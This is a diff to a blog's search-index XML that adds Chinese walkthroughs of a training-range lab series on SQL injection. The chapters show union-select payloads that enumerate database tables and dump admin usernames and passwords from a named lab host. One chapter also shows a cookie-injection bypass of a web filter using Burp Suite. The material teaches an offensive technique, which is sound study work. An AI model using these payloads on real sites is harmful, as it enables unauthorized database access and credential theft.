@@ -4,11 +4,36 @@
   
     
     <entry>
+      <title>掌控安全靶场第二章</title>
+      <link href="/2022/03/11/happy2/"/>
+      <url>/2022/03/11/happy2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="掌控安全靶场"><a href="#掌控安全靶场" class="headerlink" title="掌控安全靶场"></a>掌控安全靶场</h1><img title="null" src="/2022/03/11/happy2/1.png" alt="null"><p>我们进入靶场，使用单引号测试发现页面异常可能操作sql注入</p><img title="null" src="/2022/03/11/happy2/2.png" alt="null"><p>然后使用and 1&#x3D;1发现有拦截 </p><img title="null" src="/2022/03/11/happy2/3.png" alt="null"><p>观看关键字没有order by 所以我们用这个验证sql注入</p><img title="null" src="/2022/03/11/happy2/4.png" alt="null"><p>发现有sql漏洞我们开始注入因为waf过滤我们使用cookie注入我们需要神兵利器burp suite</p><img title="null" src="/2022/03/11/happy2/5.png" alt="null"><p>这个自带浏览器所以不用手动配置代理我们对网站进行抓注入</p><img title="null" src="/2022/03/11/happy2/6.png" alt="null"><p>右键点击send Repeater 进入重放攻击</p><img title="null" src="/2022/03/11/happy2/7.png" alt="null"><p>然后测试cookie注入我们需要url编码一下</p><p>推荐url编码在线网站<a href="https://tool.chinaz.com/tools/urlencode.aspx">UrlEncode编码&#x2F;UrlDecode解码 - 站长工具 (chinaz.com)</a> 经过url编码 的and 1&#x3D;1正常通过</p><img title="null" src="/2022/03/11/happy2/8.png" alt="null"><h2 id="然后我们正常开始注入"><a href="#然后我们正常开始注入" class="headerlink" title="然后我们正常开始注入"></a>然后我们正常开始注入</h2><p>因为我们开头知道order by 10知道有10列注意这是url编码后的</p><pre><code>  union select 1,2,3,4,5,6,7,8,9,10 from admin</code></pre><img title="null" src="/2022/03/11/happy2/9.png" alt="null"><p>回显了2、3、7、8、9 Admin表存在，也必须加，否则报错</p><pre><code> union select 1,username,password,4,5,6,7,8,9,10 from admin</code></pre><img title="null" src="/2022/03/11/happy2/10.png" alt="null"><p>返回如下内容，admin 密码就是md5加密过的welcome 找到管理员登录网址，输入账号admin密码welcome验证码登录，取得flag。</p><img title="null" src="/2022/03/11/happy2/11.png" alt="null">]]></content>
+      
+      
+      <categories>
+          
+          <category> web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>掌控安全靶场</title>
       <link href="/2022/03/09/happy/"/>
       <url>/2022/03/09/happy/</url>
       
-        <content type="html"><![CDATA[<h1 id="掌控安全靶场通思路"><a href="#掌控安全靶场通思路" class="headerlink" title="掌控安全靶场通思路"></a>掌控安全靶场通思路</h1><p>第一章：为了女神小芳！【配套课时：SQL注入攻击原理 实战演练】</p><img title="null" src="/2022/03/09/happy/1.png" alt="null" data-align="inline"><p>进入了靶场我们看见一个点击查看新闻1我们打开看看</p><img title="null" src="/2022/03/09/happy/2.png" alt="null"><p>首先说一下原理，sql注入就是用户数据交互的地方对用户过于信任，导致提交数据插入构造恶意查询语句能入数据库并执行语句。<br>sql注入分类有很多种，感兴趣自己查<br>常规操作一看url知道是数值型sql注入，很容易判读url的参数是数字</p><pre><code>执行http://rhiq8003.ia.aqlab.cn/?id=1 and 1=1</code></pre><img title="null" src="/2022/03/09/happy/3.png" alt="null"><pre><code>http://rhiq8003.ia.aqlab.cn/?id=1 and 1=2 不回显示明显int注入</code></pre><img title="null" src="/2022/03/09/happy/4.png" alt="null"><h2 id="二、判断字段数"><a href="#二、判断字段数" class="headerlink" title="二、判断字段数"></a>二、判断字段数</h2><img title="null" src="/2022/03/09/happy/5.png" alt="null"><h2 id="三、判断回显点"><a href="#三、判断回显点" class="headerlink" title="三、判断回显点"></a>三、判断回显点</h2><pre><code>?id=1 and 1=2 uinon select 1,2 -- +</code></pre><p><img title="null" src="/2022/03/09/happy/6.png" alt="null">)</p><h2 id="四、正式注入"><a href="#四、正式注入" class="headerlink" title="四、正式注入"></a>四、正式注入</h2><pre><code>?id=1 and 1=2 union select 1,database() -- + 查看数据库名</code></pre><img title="null" src="/2022/03/09/happy/7.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables wheretable_schema=database() -- + 查看表名</code></pre><img title="null" src="/2022/03/09/happy/8.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns wheretable_name=&#39;admin&#39; and table_schema=database() -- +查看列段</code></pre><img title="null" src="/2022/03/09/happy/9.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(id,0x40,username,0x3a,password) from admin --+查看值</code></pre><img title="null" src="/2022/03/09/happy/10.png" alt="null"><pre><code>flag是密码：hellohack</code></pre>]]></content>
+        <content type="html"><![CDATA[<h1 id="掌控安全靶场思路"><a href="#掌控安全靶场思路" class="headerlink" title="掌控安全靶场思路"></a>掌控安全靶场思路</h1><p>第一章：为了女神小芳！【配套课时：SQL注入攻击原理 实战演练】</p><img title="null" src="/2022/03/09/happy/1.png" alt="null" data-align="inline"><p>进入了靶场我们看见一个点击查看新闻1我们打开看看</p><img title="null" src="/2022/03/09/happy/2.png" alt="null"><p>首先说一下原理，sql注入就是用户数据交互的地方对用户过于信任，导致提交数据插入构造恶意查询语句能入数据库并执行语句。<br>sql注入分类有很多种，感兴趣自己查<br>常规操作一看url知道是数值型sql注入，很容易判读url的参数是数字</p><pre><code>执行http://rhiq8003.ia.aqlab.cn/?id=1 and 1=1</code></pre><img title="null" src="/2022/03/09/happy/3.png" alt="null"><pre><code>http://rhiq8003.ia.aqlab.cn/?id=1 and 1=2 不回显示明显int注入</code></pre><img title="null" src="/2022/03/09/happy/4.png" alt="null"><h2 id="二、判断字段数"><a href="#二、判断字段数" class="headerlink" title="二、判断字段数"></a>二、判断字段数</h2><img title="null" src="/2022/03/09/happy/5.png" alt="null"><h2 id="三、判断回显点"><a href="#三、判断回显点" class="headerlink" title="三、判断回显点"></a>三、判断回显点</h2><pre><code>?id=1 and 1=2 uinon select 1,2 -- +</code></pre><p><img title="null" src="/2022/03/09/happy/6.png" alt="null">)</p><h2 id="四、正式注入"><a href="#四、正式注入" class="headerlink" title="四、正式注入"></a>四、正式注入</h2><pre><code>?id=1 and 1=2 union select 1,database() -- + 查看数据库名</code></pre><img title="null" src="/2022/03/09/happy/7.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables wheretable_schema=database() -- + 查看表名</code></pre><img title="null" src="/2022/03/09/happy/8.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns wheretable_name=&#39;admin&#39; and table_schema=database() -- +查看列段</code></pre><img title="null" src="/2022/03/09/happy/9.png" alt="null"><pre><code>?id=1 and 1=2 union select 1,group_concat(id,0x40,username,0x3a,password) from admin --+查看值</code></pre><img title="null" src="/2022/03/09/happy/10.png" alt="null"><pre><code>flag是密码：hellohack</code></pre>]]></content>
       
       
       <categories>
